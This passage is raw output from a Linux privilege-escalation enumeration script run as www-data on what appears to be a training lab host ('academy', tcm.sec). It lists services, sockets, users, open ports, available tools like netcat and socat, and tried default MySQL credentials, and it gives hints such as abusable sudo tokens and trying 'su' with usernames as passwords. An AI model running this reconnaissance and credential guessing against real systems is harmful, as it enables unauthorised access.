https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                </span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing .service files</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                   </span></span><br><span class="line"><span class="string">/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                             </span></span><br><span class="line"><span class="string">/etc/systemd/system/mysql.service could be executing some relative path</span></span><br><span class="line"><span class="string">/etc/systemd/system/mysqld.service could be executing some relative path</span></span><br><span class="line"><span class="string">You can&#x27;</span>t write on systemd PATH</span><br><span class="line"></span><br><span class="line">╔══════════╣ System timers</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES      </span><br><span class="line">Thu 2024-02-15 14:39:00 EST  22min left Thu 2024-02-15 14:09:01 EST  7min ago     phpsessionclean.timer        phpsessionclean.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  9h left    n/a                          n/a          logrotate.timer              logrotate.service</span><br><span class="line">Fri 2024-02-16 00:00:00 EST  9h left    n/a                          n/a          man-db.timer                 man-db.service</span><br><span class="line">Fri 2024-02-16 05:17:18 EST  15h left   n/a                          n/a          apt-daily.timer              apt-daily.service</span><br><span class="line">Fri 2024-02-16 06:58:25 EST  16h left   n/a                          n/a          apt-daily-upgrade.timer      apt-daily-upgrade.service</span><br><span class="line">Fri 2024-02-16 11:30:17 EST  21h left   Thu 2024-02-15 11:30:17 EST  2h 46min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span><br><span class="line"></span><br><span class="line">╔══════════╣ Analyzing .timer files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Analyzing .socket files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    </span><br><span class="line">/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                        </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket</span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                         </span><br><span class="line">/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                         </span><br><span class="line">/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog</span><br><span class="line">/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log</span><br><span class="line">/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout</span><br><span class="line">/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket</span><br><span class="line"></span><br><span class="line">╔══════════╣ Unix Sockets Listening</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    </span><br><span class="line">sed: -e expression <span class="comment">#1, char 0: no previous regular expression                                                                 </span></span><br><span class="line">/run/dbus/system_bus_socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/mysqld/mysqld.sock</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/fsck.progress</span><br><span class="line">/run/systemd/journal/dev-log</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/stdout</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/journal/syslog</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/notify</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/systemd/private</span><br><span class="line">  └─(Read Write)</span><br><span class="line">/run/udev/control</span><br><span class="line">/run/user/0/systemd/private</span><br><span class="line">/var/run/dbus/system_bus_socket</span><br><span class="line">  └─(Read Write)</span><br><span class="line"></span><br><span class="line">╔══════════╣ D-Bus config files</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ D-Bus Service Objects list</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      </span><br><span class="line">NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION</span><br><span class="line">:1.0                               1 systemd         root             :1.0          init.scope                -          -</span><br><span class="line">:1.1                             419 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -</span><br><span class="line">:1.17                            639 systemd         root             :1.17         user@0.service            -          -</span><br><span class="line">:1.282                          7944 busctl          www-data         :1.282        apache2.service           -          -</span><br><span class="line">:1.5                             430 systemd-logind  root             :1.5          systemd-logind.service    -          -</span><br><span class="line">org.freedesktop.DBus               1 systemd         root             -             init.scope                -          -</span><br><span class="line">org.freedesktop.hostname1          - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.locale1            - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.login1           430 systemd-logind  root             :1.5          systemd-logind.service    -          -</span><br><span class="line">org.freedesktop.network1           - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.resolve1           - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.systemd1           1 systemd         root             :1.0          init.scope                -          -</span><br><span class="line">org.freedesktop.timedate1          - -               -                (activatable) -                         -</span><br><span class="line">org.freedesktop.timesync1        419 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service -          -</span><br><span class="line"></span><br><span class="line">                              ╔═════════════════════╗</span><br><span class="line">══════════════════════════════╣ Network Information ╠══════════════════════════════                                           </span><br><span class="line">                              ╚═════════════════════╝                                                                         </span><br><span class="line">╔══════════╣ Hostname, hosts and DNS</span><br><span class="line">academy                                                                                                                       </span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">127.0.1.1       academy.tcm.sec academy</span><br><span class="line"></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">domain localdomain</span><br><span class="line">search localdomain</span><br><span class="line">nameserver 192.168.19.2</span><br><span class="line">tcm.sec</span><br><span class="line"></span><br><span class="line">╔══════════╣ Interfaces</span><br><span class="line">default         0.0.0.0                                                                                                       </span><br><span class="line">loopback        127.0.0.0</span><br><span class="line">link-local      169.254.0.0</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:ac:4e:32 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.19.141/24 brd 192.168.19.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1337sec preferred_lft 1337sec</span><br><span class="line">    inet6 fe80::20c:29ff:feac:4e32/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">╔══════════╣ Active Ports</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                 </span><br><span class="line">tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*                                                    </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      </span><br><span class="line">tcp     LISTEN   0        128                    *:80                  *:*      </span><br><span class="line">tcp     LISTEN   0        32                     *:21                  *:*      </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22               [::]:*      </span><br><span class="line"></span><br><span class="line">╔══════════╣ Can I sniff with tcpdump?</span><br><span class="line">No                                                                                                                            </span><br><span class="line">                                                                                                                              </span><br><span class="line"></span><br><span class="line">                               ╔═══════════════════╗</span><br><span class="line">═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                           </span><br><span class="line">                               ╚═══════════════════╝                                                                          </span><br><span class="line">╔══════════╣ My user</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#<span class="built_in">users</span>                                                      </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)                                                                         </span><br><span class="line"></span><br><span class="line">╔══════════╣ Do I have PGP keys?</span><br><span class="line">gpg Not Found                                                                                                                 </span><br><span class="line">netpgpkeys Not Found                                                                                                          </span><br><span class="line">netpgp Not Found                                                                                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Checking <span class="string">&#x27;sudo -l&#x27;</span>, /etc/sudoers, and /etc/sudoers.d</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Checking <span class="built_in">sudo</span> tokens</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                        </span><br><span class="line">ptrace protection is disabled (0), so <span class="built_in">sudo</span> tokens could be abused                                                             </span><br><span class="line"></span><br><span class="line">╔══════════╣ Checking Pkexec policy</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                    </span><br><span class="line">                                                                                                                              </span><br><span class="line">╔══════════╣ Superusers</span><br><span class="line">root:x:0:0:root:/root:/bin/bash                                                                                               </span><br><span class="line"></span><br><span class="line">╔══════════╣ Users with console</span><br><span class="line">grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">╔══════════╣ All <span class="built_in">users</span> &amp; <span class="built_in">groups</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)                                                                                        </span><br><span class="line">uid=1(daemon[0m) gid=1(daemon[0m) <span class="built_in">groups</span>=1(daemon[0m)</span><br><span class="line">uid=10(uucp) gid=10(uucp) <span class="built_in">groups</span>=10(uucp)</span><br><span class="line">uid=100(_apt) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=1000(grimmie) gid=1000(administrator) <span class="built_in">groups</span>=1000(administrator),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)                                                                                                               </span><br><span class="line">uid=101(systemd-timesync) gid=102(systemd-timesync) <span class="built_in">groups</span>=102(systemd-timesync)</span><br><span class="line">uid=102(systemd-network) gid=103(systemd-network) <span class="built_in">groups</span>=103(systemd-network)</span><br><span class="line">uid=103(systemd-resolve) gid=104(systemd-resolve) <span class="built_in">groups</span>=104(systemd-resolve)</span><br><span class="line">uid=104(messagebus) gid=110(messagebus) <span class="built_in">groups</span>=110(messagebus)</span><br><span class="line">uid=105(sshd) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=106(mysql) gid=113(mysql) <span class="built_in">groups</span>=113(mysql)</span><br><span class="line">uid=107(ftp) gid=114(ftp) <span class="built_in">groups</span>=114(ftp)</span><br><span class="line">uid=13(proxy) gid=13(proxy) <span class="built_in">groups</span>=13(proxy)</span><br><span class="line">uid=2(bin) gid=2(bin) <span class="built_in">groups</span>=2(bin)</span><br><span class="line">uid=3(sys) gid=3(sys) <span class="built_in">groups</span>=3(sys)</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">uid=34(backup) gid=34(backup) <span class="built_in">groups</span>=34(backup)</span><br><span class="line">uid=38(list) gid=38(list) <span class="built_in">groups</span>=38(list)</span><br><span class="line">uid=39(irc) gid=39(irc) <span class="built_in">groups</span>=39(irc)</span><br><span class="line">uid=4(<span class="built_in">sync</span>) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=41(gnats) gid=41(gnats) <span class="built_in">groups</span>=41(gnats)</span><br><span class="line">uid=5(games) gid=60(games) <span class="built_in">groups</span>=60(games)</span><br><span class="line">uid=6(man) gid=12(man) <span class="built_in">groups</span>=12(man)</span><br><span class="line">uid=65534(nobody) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br><span class="line">uid=7(lp) gid=7(lp) <span class="built_in">groups</span>=7(lp)</span><br><span class="line">uid=8(mail) gid=8(mail) <span class="built_in">groups</span>=8(mail)</span><br><span class="line">uid=9(news) gid=9(news) <span class="built_in">groups</span>=9(news)</span><br><span class="line">uid=999(systemd-coredump) gid=999(systemd-coredump) <span class="built_in">groups</span>=999(systemd-coredump)</span><br><span class="line"></span><br><span class="line">╔══════════╣ Login now</span><br><span class="line"> 14:16:26 up  3:01,  1 user,  load average: 0.30, 0.07, 0.02                                                                  </span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:55m  0.02s  0.01s -bash</span><br><span class="line"></span><br><span class="line">╔══════════╣ Last logons</span><br><span class="line">root     tty1         Sat May 29 13:31:08 2021 - down                      (00:12)     0.0.0.0                                </span><br><span class="line">reboot   system boot  Sat May 29 13:30:20 2021 - Sat May 29 13:43:39 2021  (00:13)     0.0.0.0</span><br><span class="line">root     pts/0        Sat May 29 13:16:54 2021 - Sat May 29 13:27:56 2021  (00:11)     192.168.10.31</span><br><span class="line">root     tty1         Sat May 29 13:16:34 2021 - down                      (00:11)     0.0.0.0</span><br><span class="line">reboot   system boot  Sat May 29 13:15:21 2021 - Sat May 29 13:27:58 2021  (00:12)     0.0.0.0</span><br><span class="line">root     pts/0        Sat May 29 13:08:39 2021 - Sat May 29 13:14:47 2021  (00:06)     192.168.10.31</span><br><span class="line">administrator tty1         Sat May 29 13:06:40 2021 - down                      (00:08)     0.0.0.0</span><br><span class="line">reboot   system boot  Sat May 29 13:05:58 2021 - Sat May 29 13:14:49 2021  (00:08)     0.0.0.0</span><br><span class="line"></span><br><span class="line">wtmp begins Sat May 29 13:05:58 2021</span><br><span class="line"></span><br><span class="line">╔══════════╣ Last <span class="keyword">time</span> logon each user</span><br><span class="line">Username         Port     From             Latest                                                                             </span><br><span class="line">root             tty1                      Thu Feb 15 11:16:30 -0500 2024</span><br><span class="line">grimmie          pts/1    192.168.10.31    Sun May 30 03:21:39 -0400 2021</span><br><span class="line"></span><br><span class="line">╔══════════╣ Do not forget to <span class="built_in">test</span> <span class="string">&#x27;su&#x27;</span> as any other user with shell: without password and with their names as password (I don<span class="string">&#x27;t do it in FAST mode...)                                                                                                     </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Do not forget to execute &#x27;</span><span class="built_in">sudo</span> -l<span class="string">&#x27; without password or with valid password (if you know it)!!</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                             ╔══════════════════════╗</span></span><br><span class="line"><span class="string">═════════════════════════════╣ Software Information ╠═════════════════════════════                                            </span></span><br><span class="line"><span class="string">                             ╚══════════════════════╝                                                                         </span></span><br><span class="line"><span class="string">╔══════════╣ Useful software</span></span><br><span class="line"><span class="string">/usr/bin/base64                                                                                                               </span></span><br><span class="line"><span class="string">/usr/bin/nc</span></span><br><span class="line"><span class="string">/usr/bin/nc.traditional</span></span><br><span class="line"><span class="string">/usr/bin/netcat</span></span><br><span class="line"><span class="string">/usr/bin/perl</span></span><br><span class="line"><span class="string">/usr/bin/php</span></span><br><span class="line"><span class="string">/usr/bin/ping</span></span><br><span class="line"><span class="string">/usr/bin/python</span></span><br><span class="line"><span class="string">/usr/bin/python2</span></span><br><span class="line"><span class="string">/usr/bin/python2.7</span></span><br><span class="line"><span class="string">/usr/bin/python3</span></span><br><span class="line"><span class="string">/usr/bin/python3.7</span></span><br><span class="line"><span class="string">/usr/bin/socat</span></span><br><span class="line"><span class="string">/usr/bin/wget</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Installed Compilers</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ MySQL version</span></span><br><span class="line"><span class="string">mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">═╣ MySQL connection using default root/root ........... No</span></span><br><span class="line"><span class="string">═╣ MySQL connection using root/toor ................... No                                                                    </span></span><br><span class="line"><span class="string">═╣ MySQL connection using root/NOPASS ................. No                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching mysql credentials and exec</span></span><br><span class="line"><span class="string">From &#x27;</span>/etc/mysql/mariadb.conf.d/50-server.cnf<span class="string">&#x27; Mysql user: user                    = mysql                                    </span></span><br><span class="line"><span class="string">Found readable /etc/mysql/my.cnf</span></span><br><span class="line"><span class="string">[client-server]</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/conf.d/</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/mariadb.conf.d/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing MariaDB Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 869 Oct 12  2020 /etc/mysql/mariadb.cnf                                                                </span></span><br><span class="line"><span class="string">[client-server]</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/conf.d/</span></span><br><span class="line"><span class="string">!includedir /etc/mysql/mariadb.conf.d/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw------- 1 root root 277 May 29  2021 /etc/mysql/debian.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Apache-Nginx Files (limit 70)</span></span><br><span class="line"><span class="string">Apache version: Server version: Apache/2.4.38 (Debian)                                                                        </span></span><br><span class="line"><span class="string">Server built:   2020-08-25T20:08:29</span></span><br><span class="line"><span class="string">httpd Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">Nginx version: nginx Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;IfModule mod_mime.c&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf-        &lt;FilesMatch &quot;.+\.php$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf-&lt;FilesMatch &quot;.+\.ph(ar|p|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf-&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php-source</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf-&lt;FilesMatch &quot;.+\.ph(ar|p|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf-&lt;FilesMatch &quot;.+\.phps$&quot;&gt;</span></span><br><span class="line"><span class="string">/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php-source</span></span><br><span class="line"><span class="string">══╣ PHP exec extensions</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled                                                           </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/apache2/sites-enabled</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 35 May 29  2021 /etc/apache2/sites-enabled/000-default.conf -&gt; ../sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 1332 Aug  8  2020 /etc/apache2/sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 35 May 29  2021 /etc/apache2/sites-enabled/000-default.conf -&gt; ../sites-available/000-default.conf</span></span><br><span class="line"><span class="string">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="string">        ServerAdmin webmaster@localhost</span></span><br><span class="line"><span class="string">        DocumentRoot /var/www/html</span></span><br><span class="line"><span class="string">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span></span><br><span class="line"><span class="string">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span></span><br><span class="line"><span class="string">&lt;/VirtualHost&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 71958 Feb 13  2021 /etc/php/7.3/apache2/php.ini</span></span><br><span class="line"><span class="string">allow_url_fopen = On</span></span><br><span class="line"><span class="string">allow_url_include = Off</span></span><br><span class="line"><span class="string">odbc.allow_persistent = On</span></span><br><span class="line"><span class="string">ibase.allow_persistent = 1</span></span><br><span class="line"><span class="string">mysqli.allow_persistent = On</span></span><br><span class="line"><span class="string">pgsql.allow_persistent = On</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 71570 Feb 13  2021 /etc/php/7.3/cli/php.ini</span></span><br><span class="line"><span class="string">allow_url_fopen = On</span></span><br><span class="line"><span class="string">allow_url_include = Off</span></span><br><span class="line"><span class="string">odbc.allow_persistent = On</span></span><br><span class="line"><span class="string">ibase.allow_persistent = 1</span></span><br><span class="line"><span class="string">mysqli.allow_persistent = On</span></span><br><span class="line"><span class="string">pgsql.allow_persistent = On</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Rsync Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 1044 Mar 15  2019 /usr/share/doc/rsync/examples/rsyncd.conf                                            </span></span><br><span class="line"><span class="string">[ftp]</span></span><br><span class="line"><span class="string">        comment = public archive</span></span><br><span class="line"><span class="string">        path = /var/www/pub</span></span><br><span class="line"><span class="string">        use chroot = yes</span></span><br><span class="line"><span class="string">        lock file = /var/lock/rsyncd</span></span><br><span class="line"><span class="string">        read only = yes</span></span><br><span class="line"><span class="string">        list = yes</span></span><br><span class="line"><span class="string">        uid = nobody</span></span><br><span class="line"><span class="string">        gid = nogroup</span></span><br><span class="line"><span class="string">        strict modes = yes</span></span><br><span class="line"><span class="string">        ignore errors = no</span></span><br><span class="line"><span class="string">        ignore nonreadable = yes</span></span><br><span class="line"><span class="string">        transfer logging = no</span></span><br><span class="line"><span class="string">        timeout = 600</span></span><br><span class="line"><span class="string">        refuse options = checksum dry-run</span></span><br><span class="line"><span class="string">        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Ldap Files (limit 70)</span></span><br><span class="line"><span class="string">The password hash is from the &#123;SSHA&#125; to &#x27;</span>structural<span class="string">&#x27;                                                                          </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/ldap</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching ssl/ssh files</span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing SSH Files (limit 70)                                                                                   </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 174 May 29  2021 /etc/ssh/ssh_host_ecdsa_key.pub</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 94 May 29  2021 /etc/ssh/ssh_host_ed25519_key.pub</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 394 May 29  2021 /etc/ssh/ssh_host_rsa_key.pub</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PermitRootLogin yes</span></span><br><span class="line"><span class="string">ChallengeResponseAuthentication no</span></span><br><span class="line"><span class="string">UsePAM yes</span></span><br><span class="line"><span class="string">══╣ Some certificates were found (out limited):</span></span><br><span class="line"><span class="string">/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                  </span></span><br><span class="line"><span class="string">/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Actalis_Authentication_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Commercial.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Networking.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Premium.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/AffirmTrust_Premium_ECC.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_1.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_2.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_3.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Amazon_Root_CA_4.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Atos_TrustedRoot_2011.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Baltimore_CyberTrust_Root.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Buypass_Class_2_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Buypass_Class_3_Root_CA.pem</span></span><br><span class="line"><span 